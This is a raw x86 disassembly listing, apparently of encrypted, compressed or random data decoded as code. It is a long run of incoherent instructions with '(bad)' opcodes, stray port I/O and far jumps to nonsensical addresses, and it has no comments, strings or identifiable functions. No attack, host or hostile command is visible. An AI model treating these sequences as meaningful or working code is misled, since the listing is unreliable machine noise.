  421a04:	and    al,0x66
  421a06:	add    DWORD PTR [eax],eax
  421a08:	add    al,0x1
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	push   eax
  421a0d:	xchg   ebp,eax
  421a0e:	sbb    BYTE PTR [ebp-0x14acb5f],0x2b
  421a15:	sbb    DWORD PTR [ebp+0x7819a1a4],0x51
  421a1c:	pushf  
  421a1d:	xchg   ebx,eax
  421a1e:	or     eax,0x2ae40d9a
  421a23:	into   
  421a24:	push   edi
  421a25:	pushf  
  421a26:	arpl   WORD PTR [eax+0x42cb4c66],cx
  421a2c:	xchg   edx,eax
  421a2d:	mov    ah,0xe
  421a2f:	shl    DWORD PTR [eax-0x39],1
  421a32:	xchg   ebx,eax
  421a33:	test   eax,0x61fda209
  421a38:	pusha  
  421a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a3a:	sub    eax,DWORD PTR ds:0xcedabcd
  421a40:	xchg   DWORD PTR [edx],esp
  421a42:	pop    ebp
  421a43:	push   ebx
  421a44:	mov    bl,0x3
  421a46:	lahf   
  421a47:	scas   al,BYTE PTR es:[edi]
  421a48:	push   edx
  421a49:	xchg   esi,eax
  421a4a:	jmp    0x421a8c
  421a4c:	xchg   ecx,eax
  421a4d:	into   
  421a4e:	mov    eax,0xf4b4ce3d
  421a53:	popa   
  421a54:	dec    ebp
  421a55:	and    BYTE PTR [ebp-0x4b2b10e6],0x5f
  421a5c:	shl    BYTE PTR [esi-0x4c],cl
  421a5f:	jg     0x421ab8
  421a61:	call   0xa5834574
  421a66:	test   DWORD PTR [ecx+0xeb6a818],edi
  421a6c:	mov    ebx,DWORD PTR [edx+0x606ec5a]
  421a72:	mov    ds:0x4f149053,al
  421a77:	pop    ss
  421a78:	(bad)  
  421a79:	mov    ecx,0xd5454a33
  421a7e:	test   eax,0x26a41e95
  421a83:	ja     0x421a5c
  421a85:	sub    eax,0xb9cb4629
  421a8a:	push   0xffffffa5
  421a8c:	push   ecx
  421a8d:	imul   ebp,DWORD PTR [ecx+0x1151c3bc],0x7c
  421a94:	js     0x421ae3
  421a96:	test   DWORD PTR [edi+0x3b60eec7],eax
  421a9c:	or     al,0xe1
  421a9e:	cmp    BYTE PTR ds:0xe7d3ac2a,dl
  421aa4:	les    ebp,FWORD PTR [esi]
  421aa6:	popa   
  421aa7:	retf   
  421aa8:	inc    edi
  421aa9:	sahf   
  421aaa:	jne    0x421a59
  421aac:	mov    BYTE PTR [ebx+0x4024990c],ah
  421ab2:	push   0x2b50a2c7
  421ab7:	es cli 
  421ab9:	dec    ebx
  421aba:	imul   esi,DWORD PTR [edx+0x1db1f1af],0xe9434fa2
  421ac4:	(bad)  
  421ac5:	xchg   edx,eax
  421ac6:	in     al,dx
  421ac7:	sbb    eax,0xce0cac80
  421acc:	fcomp  DWORD PTR [ebx]
  421ace:	(bad)  
  421acf:	in     al,0xde
  421ad1:	addr16 call 0x2b8c:0x9ff36b2b
  421ad9:	dec    ebx
  421ada:	or     cl,0x95
  421add:	add    ebp,DWORD PTR [ebx-0x11]
  421ae0:	cmp    BYTE PTR [ebp-0x6a0b30d9],al
  421ae6:	hlt    
  421ae7:	sub    ebp,DWORD PTR [edx]
  421ae9:	cwde   
  421aea:	repnz sbb al,0x85
  421aed:	sub    DWORD PTR [ebx+edi*1-0x9],eax
  421af1:	jle    0x421aaa
  421af3:	jg     0x421ad4
  421af5:	popa   
  421af6:	lds    ecx,FWORD PTR [eax]
  421af8:	mov    al,ds:0x7624a6c
  421afd:	fdivr  DWORD PTR [edi+0x290db20d]
  421b03:	inc    ebp
  421b04:	sbb    BYTE PTR [ecx],cl
  421b06:	out    0xb1,al
  421b08:	int3   
  421b09:	fs xchg esi,eax
  421b0b:	push   ss
  421b0c:	repz call 0x42de73
	...
  421b72:	add    BYTE PTR [eax],al
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     cl,BYTE PTR [ebp+0x39]
  421b82:	shl    DWORD PTR [edx+0x28],1
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    al,0x1
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	sub    ebp,eax
  421b8e:	imul   edx,DWORD PTR [edx+0x67abf6a9],0x8ec0a1ee
  421b98:	pop    edx
  421b99:	cli    
  421b9a:	retf   0xbf0b
  421b9d:	adc    BYTE PTR ds:0xff16ada7,0xf8
  421ba4:	cmp    DWORD PTR [bx],ebx
  421ba7:	nop
  421ba8:	call   0xb18bfab3
  421bad:	push   eax
  421bae:	(bad)  
  421baf:	jmp    0xc485:0x3929fc02
  421bb6:	in     eax,dx
  421bb7:	dec    edx
  421bb8:	(bad)  
  421bb9:	aam    0xe
  421bbb:	lods   eax,DWORD PTR ds:[esi]
  421bbc:	in     al,0x72
  421bbe:	add    ch,BYTE PTR [edx-0x7674bd7c]
  421bc4:	stc    
  421bc5:	pop    ebx
  421bc6:	pop    eax
  421bc7:	xchg   esi,eax
  421bc8:	xchg   DWORD PTR [ecx+0xd6f2ae2],edi
  421bce:	jno    0x421c0f
  421bd0:	mov    bl,0xa0
  421bd2:	jo     0x421c3d
  421bd4:	cmp    eax,DWORD PTR [ebx-0x28]
  421bd7:	in     eax,0x8b
  421bd9:	mov    DWORD PTR [ecx+0x54],esp
  421bdc:	shr    DWORD PTR ds:0xf357f24a,1
  421be2:	sub    BYTE PTR [ecx+0x2ffa14ca],0xd6
  421be9:	xchg   ebx,eax
  421bea:	fdivr  st(1),st
  421bec:	mov    DWORD PTR [ebx+ebp*1],0xe27f13ef
  421bf3:	xchg   BYTE PTR [edx+0x2e],ah
  421bf6:	dec    BYTE PTR [ecx]
  421bf8:	sbb    al,0x57
  421bfa:	pop    edx
  421bfb:	add    ch,ch
  421bfd:	pop    ds
  421bfe:	inc    esi
  421bff:	loopne 0x421c22
  421c01:	in     al,0x31
  421c03:	iret   
  421c04:	push   esp
  421c05:	mov    edi,0xa5da2693
  421c0a:	adc    DWORD PTR [ebx-0x3e],0xffffffd3
  421c0e:	push   ecx
  421c0f:	outs   dx,DWORD PTR ds:[esi]
  421c10:	mov    edx,0xcc17c0ef
  421c15:	mov    cl,0x49
  421c17:	cli    
  421c18:	push   es
  421c19:	jnp    0x421bec
  421c1b:	scas   al,BYTE PTR es:[edi]
  421c1c:	ds jne 0x421bb3
  421c1f:	daa    
  421c20:	fstp   DWORD PTR [ecx-0x7132d0ad]
  421c26:	stos   BYTE PTR es:[edi],al
  421c27:	js     0x421c44
  421c29:	mov    es:0xd0567c27,eax
  421c2f:	jp     0x421c66
  421c31:	aas    
  421c32:	and    DWORD PTR [ecx+0x10],esi
  421c35:	sbb    eax,0x908e58b6
  421c3a:	add    DWORD PTR [edx+0x4a40099b],ecx
  421c40:	cmp    edx,DWORD PTR [ecx+0x58b4372]
  421c46:	les    ebp,FWORD PTR [edx+0x70]
  421c49:	push   edi
  421c4a:	sti    
  421c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c4c:	pop    ebx
  421c4d:	adc    al,0xee
  421c4f:	shl    BYTE PTR ds:0x8781f6ba,cl
  421c55:	pop    edx
  421c56:	shl    BYTE PTR [ebp+ecx*4+0x6b],cl
  421c5a:	nop
  421c5b:	cli    
  421c5c:	dec    edx
  421c5d:	sbb    BYTE PTR [eax+0x2f0a96e1],0xa7
  421c64:	shl    DWORD PTR [esi-0x3389dadf],cl
  421c6a:	mov    bh,0xf3
  421c6c:	test   eax,0x9a9e2d47
  421c71:	in     al,0x96
  421c73:	cli    
  421c74:	les    eax,FWORD PTR [eax+eax*1-0x7c954502]
  421c7b:	push   ecx
  421c7c:	loop   0x421c55
  421c7e:	jmp    0x461fb8c0
  421c83:	mov    ebx,0x615ffce0
  421c88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c89:	rcl    DWORD PTR ds:0x8add546f,0x8e
	...
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	int    0xcd
  421d02:	(bad)  
  421d03:	push   ebp
  421d04:	sub    al,0x68
  421d06:	add    DWORD PTR [eax],eax
  421d08:	add    al,0x1
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	popa   
  421d0d:	sbb    esp,DWORD PTR [ebp+0x76965041]
  421d13:	jmp    0xc93e9594
  421d18:	sbb    BYTE PTR [ecx-0x29],bh
  421d1b:	fidiv  DWORD PTR [edx]
  421d1d:	lods   al,BYTE PTR ds:[esi]
  421d1e:	add    BYTE PTR [esi],0x64
  421d21:	xchg   esp,eax
  421d22:	push   ds
  421d23:	cmp    BYTE PTR [edi-0x2f733371],0x7d
  421d2a:	loopne 0x421d30
  421d2c:	xchg   ecx,eax
  421d2d:	cmp    DWORD PTR [ecx+edi*1+0x1a],ebx
  421d31:	test   ebp,ecx
  421d33:	mov    esp,0xe4403329
  421d38:	sbb    al,dl
  421d3a:	pop    ebx
  421d3b:	fsub   DWORD PTR [esi-0x70]
  421d3e:	jns    0x421cfc
  421d40:	mov    ebp,0xfb6eaf91
  421d45:	test   DWORD PTR [esi+0x4e],edx
  421d48:	loope  0x421d76
  421d4a:	(bad)  
  421d4b:	shr    BYTE PTR [edi+ebx*8],1
  421d4e:	lahf   
  421d4f:	sbb    ah,BYTE PTR [ecx+0x15333e49]
  421d55:	jmp    0xe657:0x9d9d7e39
  421d5c:	(bad)  
  421d5d:	stc    
  421d5e:	test   al,0x17
  421d60:	add    BYTE PTR [edi+0x46f7dbb3],ch
  421d66:	ret    
  421d67:	push   0x74
  421d69:	xor    al,0x49
  421d6b:	(bad)  
  421d6c:	aas    
  421d6d:	test   eax,0xa1d09a7a
  421d72:	std    
  421d73:	xlat   BYTE PTR ds:[ebx]
  421d74:	pop    ss
  421d75:	ja     0x421de8
  421d77:	inc    esi
  421d78:	xor    ch,BYTE PTR ds:0xef82fa60
  421d7e:	fisttp DWORD PTR [ebp+0x2ea32678]
  421d84:	test   DWORD PTR [ecx-0xefe4423],0x83865c2
  421d8e:	or     BYTE PTR [ebp+0xc],0xd5
  421d92:	xchg   ecx,eax
  421d93:	jae    0x421d84
  421d95:	add    ah,BYTE PTR [edi-0x61]
  421d98:	jno    0x421d4f
  421d9a:	lock mov ds:0x5e7dc7dd,al
  421da0:	or     al,0x7b
  421da2:	jg     0x421de8
  421da4:	mov    al,0x62
  421da6:	jbe    0x421db1
  421da8:	retf   
  421da9:	fild   WORD PTR [edx-0x1a]
  421dac:	cdq    
  421dad:	add    al,al
  421daf:	stos   BYTE PTR es:[edi],al
  421db0:	xor    BYTE PTR [eax-0x780ad803],bh
  421db6:	stos   BYTE PTR es:[edi],al
  421db7:	cli    
  421db8:	inc    eax
  421db9:	fadd   DWORD PTR [edi+0x6686978b]
  421dbf:	les    edx,FWORD PTR [eax]
  421dc1:	sti    
  421dc2:	repnz and dh,BYTE PTR [ebp+0x4d2d54b3]
  421dc9:	cmp    eax,0xf7d96c74
  421dce:	mov    bl,BYTE PTR [eax-0x3d38f88f]
  421dd4:	lock pop edx
  421dd6:	sub    al,0x74
  421dd8:	jb     0x421e25
  421dda:	add    esp,DWORD PTR [ebx-0x65]
  421ddd:	nop
  421dde:	sbb    ebp,0x69
  421de1:	sti    
  421de2:	pop    edi
  421de3:	(bad)  [ebx]
  421de5:	jo     0x421da3
  421de7:	mov    ebp,0x1fee5918
  421dec:	sub    ebx,esi
  421dee:	or     dl,BYTE PTR [edi-0x12c064ee]
  421df4:	mov    bl,0x41
  421df6:	cli    
  421df7:	repz dec eax
  421df9:	into   
  421dfa:	sub    DWORD PTR [ebp+ecx*4-0x35708569],edx
  421e01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e02:	and    DWORD PTR [ebx*8+0x4bc98135],esp
  421e09:	stc    
  421e0a:	hlt    
  421e0b:	fldenv [ebp+0xca5151]
	...
  421e71:	add    BYTE PTR [eax],al
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	mov    eax,0x308a5ab9
  421e85:	imul   eax,DWORD PTR [ecx],0x10400
  421e8b:	add    BYTE PTR [edx+0x79],dh
  421e8e:	jnp    0x421e29
  421e90:	popf   
  421e91:	es js  0x421ed4
  421e94:	out    dx,al
  421e95:	jae    0x421ef6
  421e97:	add    cl,BYTE PTR [esi+ebx*4]
  421e9a:	mov    eax,ds:0xc1bb8d5b
  421e9f:	in     eax,dx
  421ea0:	adc    ah,BYTE PTR [edx-0x2a422698]
  421ea6:	aam    0xe6
  421ea8:	stos   DWORD PTR es:[edi],eax
  421ea9:	push   cs
  421eaa:	sub    al,0xef
  421eac:	call   0x6e02:0x3ac39387
  421eb3:	dec    ecx
  421eb4:	inc    eax
  421eb5:	mov    eax,0x1cd8fd
  421eba:	arpl   WORD PTR [ebx*1+0x709eb929],si
  421ec1:	mov    eax,0x9576ab37
  421ec6:	xchg   DWORD PTR [esi-0x70],eax
  421ec9:	add    ecx,0x7c3a4bbc
  421ecf:	enter  0xaab2,0x81
  421ed3:	jl     0x421f19
  421ed5:	inc    esi
  421ed6:	mov    edx,0x83d5f998
  421edb:	out    dx,eax
  421edc:	mov    edx,0xa7df21e2
  421ee1:	xor    ebp,DWORD PTR [ebx]
  421ee3:	sbb    bl,0xe3
  421ee6:	nop
  421ee7:	mov    edi,DWORD PTR [edx]
  421ee9:	mov    ebp,0xea5946f0
  421eee:	inc    edi
  421eef:	inc    ebx
  421ef0:	aad    0x5b
  421ef2:	outs   dx,BYTE PTR ds:[esi]
  421ef3:	sub    al,0x28
  421ef5:	and    ebp,DWORD PTR [ecx-0x80]
  421ef8:	push   edi
  421ef9:	push   eax
  421efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421efb:	test   BYTE PTR [esi],dh
  421efd:	fsubr  QWORD PTR [esp+eiz*4]
  421f00:	sbb    bh,bh
  421f02:	call   0x1b3d0bd
  421f07:	xchg   DWORD PTR [ecx+0x2c],edi
  421f0a:	mov    eax,0xc578afd1
  421f0f:	imul   esp,eax,0x55a9b6a6
  421f15:	mov    edx,0x7767fd5a
  421f1a:	ds in  eax,dx
  421f1c:	pop    ecx
  421f1d:	push   ecx
  421f1e:	lss    ebp,FWORD PTR [esi+0x28]
  421f22:	jns    0x421edc
  421f24:	jge    0x421eb4
  421f26:	add    al,0xe5
  421f28:	cmp    BYTE PTR [ebx+0x78],0x81
  421f2c:	sahf   
  421f2d:	or     BYTE PTR [eax+0x79],ch
  421f30:	dec    edi
  421f31:	pop    esp
  421f32:	jl     0x421ef1
  421f34:	je     0x421f2a
  421f36:	sbb    BYTE PTR [edx+eiz*8],cl
  421f39:	lds    ecx,FWORD PTR [edi]
  421f3b:	jg     0x421eda
  421f3d:	inc    edx
  421f3e:	in     eax,0x50
  421f40:	repnz lds ebp,FWORD PTR [ecx]
  421f43:	or     al,0xa6
  421f45:	jmp    0x421fc2
  421f47:	rol    DWORD PTR [edi+0x5fc3de8b],1
  421f4d:	(bad)  
  421f4e:	mov    WORD PTR ds:0x64e3725a,cs
  421f54:	test   al,0xc4
  421f56:	push   cs
  421f57:	xor    edx,DWORD PTR [ecx]
  421f59:	shl    DWORD PTR [ecx+0xb],1
  421f5c:	dec    ecx
  421f5d:	sti    
  421f5e:	adc    ecx,eax
  421f60:	rcl    DWORD PTR [eax+0x2e297149],0x8e
  421f67:	mov    ebx,0x1aff35b0
  421f6c:	ss mov ah,0xdd
  421f6f:	pop    es
  421f70:	mov    eax,es:0x73fab21b
  421f76:	js     0x421fe1
  421f78:	fwait
  421f79:	add    edi,edi
  421f7b:	test   al,0x41
  421f7d:	and    cl,dl
  421f7f:	cmp    BYTE PTR [esi-0x7d],0x16
  421f83:	push   ebx
  421f84:	push   ebp
  421f85:	out    dx,eax
  421f86:	shl    esp,1
  421f88:	mov    BYTE PTR [edx+0x7eab57c5],bh
  421f8e:	mov    eax,0x7d
	...
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	adc    WORD PTR [edi],bp
  422002:	jmp    0x1ac54f6
  422007:	add    BYTE PTR [ecx+eax*1],al
  42200a:	add    BYTE PTR [eax],al
  42200c:	cmp    dh,BYTE PTR [edi]
  42200e:	scas   eax,DWORD PTR es:[edi]
  42200f:	xor    BYTE PTR [eax],cl
  422011:	and    eax,0xdbfa70f
  422016:	in     eax,dx
  422017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422018:	(bad)  
  422019:	adc    dh,BYTE PTR [ebx+0x3307ce6b]
  42201f:	scas   eax,DWORD PTR es:[edi]
  422020:	xor    DWORD PTR [esi],ebp
  422022:	mov    dl,0x70
  422024:	push   ds
  422025:	adc    esi,esi
  422027:	pop    ss
  422028:	mov    eax,0xd0e3ca8c
  42202d:	or     eax,0x891af566
  422032:	repz adc ebx,edx
  422035:	sbb    eax,0xac2669bd
  42203a:	ins    BYTE PTR es:[edi],dx
  42203b:	and    esp,DWORD PTR [edi+ebp*4]
  42203e:	xchg   BYTE PTR [esi+0x7e986280],ah
  422044:	adc    ebp,edi
  422046:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422048:	jg     0x422035
  42204a:	test   BYTE PTR [ecx-0x55],0xa1
  42204e:	mov    edi,edx
  422050:	and    DWORD PTR [ecx-0x339318be],esp
  422056:	fsin   
  422058:	data16 mov cl,0x17
  42205b:	sti    
  42205c:	in     eax,dx
  42205d:	xor    BYTE PTR [esi+0x178a5225],dh
  422063:	into   
  422064:	popa   
  422065:	test   eax,0xcbef5449
  42206a:	mov    dl,BYTE PTR [edi-0x3a]
  42206d:	sbb    ebx,DWORD PTR [esi]
  42206f:	push   esp
  422070:	jae    0x4220d8
  422072:	daa    
  422073:	dec    esp
  422074:	add    dh,BYTE PTR [edi+ebp*1]
  422077:	mov    bl,0x54
  422079:	adc    BYTE PTR [eax+0x4147d359],ch
  42207f:	mov    ds:0xd3c2f1aa,eax
  422084:	imul   esi,DWORD PTR [esi],0xa842678a
  42208a:	out    0x0,al
  42208c:	and    al,0x8b
  42208e:	mul    ecx
  422090:	mov    edi,0xbe1e8f9e
  422095:	lods   eax,DWORD PTR ds:[esi]
  422096:	dec    esi
  422097:	cwde   
  422098:	fmul   st(3),st
  42209a:	pop    eax
  42209b:	ret    0x74d6
  42209e:	xchg   BYTE PTR [esi+0x28991323],bh
  4220a4:	pop    ebx
  4220a5:	adc    eax,0x5c04938e
  4220aa:	jmp    0x4220f5
  4220ac:	loopne 0x422040
  4220ae:	adc    BYTE PTR [edi-0x37],0xf8
  4220b2:	aad    0x2
  4220b4:	or     BYTE PTR [edx+0x679a92f7],ah
  4220ba:	inc    ecx
  4220bb:	lds    ebx,FWORD PTR fs:[esi-0x49fcd710]
  4220c2:	mov    ah,0x7f
  4220c4:	adc    bh,BYTE PTR [ecx]
  4220c6:	dec    ecx
  4220c7:	in     al,0x11
  4220c9:	call   0x82ad:0x4633aef8
  4220d0:	mul    DWORD PTR [esi]
  4220d2:	repz adc al,0x48
  4220d5:	gs mov bl,0xf1
  4220d8:	(bad)  
  4220da:	pop    ss
  4220db:	imul   esi,DWORD PTR [ecx],0xffffffdf
  4220de:	rcr    DWORD PTR [ebp-0x1f],0x53
  4220e2:	push   0xe37fb924
  4220e7:	pop    ebx
  4220e8:	push   edx
  4220e9:	lea    esi,[edi+0x5a]
  4220ec:	jmp    0x14a4:0xa6d407ac
  4220f3:	dec    esi
  4220f4:	(bad)  
  4220f5:	in     al,dx
  4220f6:	mov    eax,ds:0xe9c44416
  4220fb:	mov    ch,0x7e
  4220fd:	mov    al,0xe5
  4220ff:	setbe  dl
  422102:	repz push ds
  422104:	out    0xe3,al
  422106:	push   eax
  422107:	rcl    DWORD PTR [ebx+0xb],cl
  42210a:	rcr    DWORD PTR [edi+eiz*4+0xc0e2c],1
	...
  422171:	add    BYTE PTR [eax],al
  422173:	add    BYTE PTR [esi-0x284ae],ah
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    esp,DWORD PTR ds:0x38e90619
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    al,0x1
  42218a:	add    BYTE PTR [eax],al
  42218c:	sbb    eax,0x5ff26bc2
  422191:	jnp    0x422205
  422193:	(bad)  
  422195:	jno    0x422154
  422197:	adc    eax,0x9167f637
  42219c:	mov    bh,0x3f
  42219e:	push   es
  42219f:	add    BYTE PTR [esi+esi*1-0x6a8ebd81],bh
  4221a6:	jecxz  0x42215e
  4221a8:	xor    bh,ch
  4221aa:	mov    esp,0x4e25b7b0
  4221af:	(bad)  
  4221b0:	pop    ebp
  4221b1:	(bad)  
  4221b3:	xchg   edx,eax
  4221b4:	xor    BYTE PTR [ebx+eax*4-0x58],dl
  4221b8:	repz pop esp
  4221ba:	out    dx,al
  4221bb:	cmp    al,0xd8
  4221bd:	mov    dl,0x98
  4221bf:	push   edx
  4221c0:	icebp  
  4221c1:	imul   ebp,ebx,0x7b
  4221c4:	cmp    eax,0xbe0f6e62
  4221c9:	mov    dh,cl
  4221cb:	add    bl,BYTE PTR [ebp-0x42aac1c9]
  4221d1:	aaa    
  4221d2:	test   al,0xa6
  4221d4:	(bad)  
  4221d5:	sbb    al,0xc8
  4221d7:	cmp    al,BYTE PTR [ebx]
  4221d9:	aaa    
  4221da:	and    al,0x3f
  4221dc:	fld    TBYTE PTR [edx-0xa]
  4221df:	jbe    0x422204
  4221e1:	stc    
  4221e2:	add    BYTE PTR [eax],dh
  4221e4:	je     0x422234
  4221e6:	clc    
  4221e7:	pop    ss
  4221e8:	sub    eax,0x35f9989f
  4221ed:	add    DWORD PTR [esi-0x70c990eb],ebp
  4221f3:	(bad)  
  4221f4:	mov    bh,0xcc
  4221f6:	dec    ebx
  4221f7:	lahf   
  4221f8:	push   edx
  4221f9:	cmp    al,0xb7
  4221fb:	mov    cl,0x2f
  4221fd:	fwait
  4221fe:	and    ebp,DWORD PTR [eax]
  422200:	mov    ecx,0xb57439e8
  422205:	pop    ss
  422206:	pop    eax
  422207:	adc    DWORD PTR [edi-0xa4a0b9b],esi
  42220d:	out    0x2a,eax
  42220f:	push   edx
  422210:	test   cl,0x3d
  422213:	dec    ecx
  422214:	add    al,0x68
  422216:	addr16 retf 0x293c
  42221a:	popa   
  42221b:	fidiv  WORD PTR ds:0x922abdce
  422221:	sub    dh,BYTE PTR [eax-0x61]
  422224:	es xchg edi,eax
  422226:	retf   
  422227:	xchg   edx,eax
  422228:	xchg   ebx,eax
  422229:	xor    DWORD PTR [edi+eiz*8-0x34],edx
  42222d:	enter  0x31a2,0x87
  422231:	call   FWORD PTR [ecx+0x4430adac]
  422237:	xchg   esi,eax
  422238:	(bad)  
  422239:	xor    al,0x28
  42223b:	stc    
  42223c:	jle    0x42226a
  42223e:	test   BYTE PTR [eax+0x76],bh
  422241:	mov    ?,WORD PTR [ecx+0x7a1156fd]
  422247:	inc    edi
  422248:	fisttp QWORD PTR [ebx]
  42224a:	cdq    
  42224b:	adc    edi,esi
  42224d:	and    DWORD PTR [edx-0x175d21ed],edx
  422253:	mov    cl,0x2f
  422255:	das    
  422256:	adc    DWORD PTR [esi+0x62],edi
  422259:	sahf   
  42225a:	sub    BYTE PTR [ecx+0x51],cl
  42225d:	dec    esi
  42225e:	add    dh,BYTE PTR [esi-0x6575c82a]
  422264:	add    ebx,DWORD PTR [ebx-0x27ca6c03]
  42226a:	mov    dl,0xe6
  42226c:	push   ecx
  42226d:	mov    edx,0x69297c5d
  422272:	or     BYTE PTR [edx+0x7cde013a],cl
  422278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422279:	pop    edi
  42227a:	sub    eax,0x2e55c442
  42227f:	(bad)  
  422280:	dec    ebp
  422281:	xchg   esi,eax
  422282:	retf   0x763e
  422285:	pop    ebx
  422286:	dec    eax
  422287:	and    al,0x3b
  422289:	mov    dh,0x42
  42228b:	pop    ebx
  42228c:	adc    eax,0x1cc596
	...
  4222f1:	add    BYTE PTR [eax],al
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	mov    dh,0xb7
  422302:	test   BYTE PTR [edi+0x3c],al
  422305:	ins    BYTE PTR es:[edi],dx
  422306:	add    DWORD PTR [eax],eax
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	push   0xe051f316
  422311:	fadd   QWORD PTR [esp+ebx*8+0x66a51412]
  422318:	or     dh,BYTE PTR [edx*4+0x3e2ec491]
  42231f:	xor    eax,0x8e5e7f37
  422324:	jecxz  0x42234e
  422326:	sbb    edx,DWORD PTR [ecx+edi*8+0x75]
  42232a:	mov    bl,0x77
  42232c:	dec    edi
  42232d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42232e:	int    0x8c
  422330:	fwait
  422331:	ja     0x422374
  422333:	ins    BYTE PTR es:[edi],dx
  422334:	mov    ebp,0xbe7fc93b
  422339:	(bad)  
  42233a:	fst    DWORD PTR [ecx+0x37fd3891]
  422340:	mov    ah,BYTE PTR [edx]
  422342:	sbb    DWORD PTR [bp+di+0x47],0xffffffd4
  422347:	call   0x1c8e00a0
  42234c:	mov    bl,0x23
  42234e:	and    al,0x52
  422350:	mov    edx,0x442df026
  422355:	outs   dx,DWORD PTR ds:[esi]
  422356:	mov    edx,DWORD PTR [ebp-0x66]
  422359:	mov    ecx,0x9b5d6ccd
  42235e:	mov    al,BYTE PTR [ebp+0x51]
  422361:	iret   
  422362:	xchg   ebx,eax
  422363:	cmp    al,0xae
  422365:	out    dx,eax
  422366:	push   ebx
  422367:	cmp    BYTE PTR [ebp+0x9],0xb4
  42236b:	fidiv  DWORD PTR [edi]
  42236d:	sar    DWORD PTR [eax+eax*8-0x92dd537],cl
  422374:	iret   
  422375:	xor    ebx,DWORD PTR [eax+0x1a]
  422378:	outs   dx,BYTE PTR ds:[esi]
  422379:	inc    ebp
  42237a:	int    0x85
  42237c:	shr    BYTE PTR [ebx-0x43beeaa2],1
  422382:	mov    ss,eax
  422384:	push   ds
  422385:	pop    ebx
  422386:	sbb    dl,BYTE PTR [esi-0x57]
  422389:	je     0x4223f5
  42238b:	fmul   st(6),st
  42238d:	sub    bl,ch
  42238f:	lods   al,BYTE PTR ds:[esi]
  422390:	out    dx,eax
  422391:	mov    ds:0x9e6c912e,al
  422396:	dec    edi
  422397:	leave  
  422398:	pop    ebp
  422399:	imul   ebx,DWORD PTR [ebp+0x22],0x2e
  42239d:	das    
  42239e:	xor    al,0x5f
  4223a0:	inc    ebp
  4223a1:	loopne 0x422414
  4223a3:	inc    edi
  4223a4:	and    eax,0xcb6b4051
  4223a9:	jg     0x422354
  4223ab:	sub    BYTE PTR [edi],cl
  4223ad:	jne    0x4223c7
  4223af:	bound  edi,QWORD PTR [esi+0x69]
  4223b2:	hlt    
  4223b3:	dec    ecx
  4223b4:	adc    ah,BYTE PTR [eax-0x29]
  4223b7:	repnz pop ecx
  4223b9:	xor    al,0x35
  4223bb:	push   0x6e2f9963
  4223c0:	mov    bh,0x77
  4223c2:	adc    eax,0xd97aee8d
  4223c7:	cmp    al,0x6e
  4223c9:	bound  ebx,QWORD PTR ds:0xe2d25a7a
  4223cf:	push   0xfeca6e08
  4223d4:	sub    edx,esp
  4223d6:	loopne 0x422400
  4223d8:	jmp    0x7225b669
  4223dd:	sub    DWORD PTR [eax+eiz*4],ebp
  4223e0:	adc    bl,dl
  4223e2:	out    0x73,al
  4223e4:	stc    
  4223e5:	pop    edi
  4223e6:	shr    BYTE PTR [edi+edx*1],0xc4
  4223ea:	adc    cl,BYTE PTR [ebp-0x49036dd6]
  4223f0:	jbe    0x422396
  4223f2:	mov    WORD PTR [eax+ebp*2+0x41],cs
  4223f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f7:	jecxz  0x422432
  4223f9:	lock pop ss
  4223fb:	jg     0x422455
  4223fd:	jne    0x422434
  4223ff:	mov    al,al
  422401:	bound  edi,QWORD PTR [ecx-0x19dcfbd8]
  422407:	cmp    al,0x41
  422409:	inc    edi
  42240a:	jb     0x42243a
  42240c:	sbb    BYTE PTR [edx-0x5c],0x2a
	...
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	sbb    DWORD PTR [ebp+0x6d407dbc],eax
  422486:	add    DWORD PTR [eax],eax
  422488:	add    al,0x1
  42248a:	add    BYTE PTR [eax],al
  42248c:	xchg   edi,eax
  42248d:	sub    al,BYTE PTR [edx]
  42248f:	push   ds
  422490:	push   edi
  422491:	(bad)  [esi+0x1b]
  422494:	push   es
  422495:	xchg   edi,eax
  422496:	outs   dx,DWORD PTR ds:[esi]
  422497:	jl     0x4224e2
  422499:	pop    edi
  42249a:	cmp    ah,dl
  42249c:	(bad)  
  42249d:	ds mov dh,0xab
  4224a0:	call   DWORD PTR [edx+0x47702170]
  4224a6:	sahf   
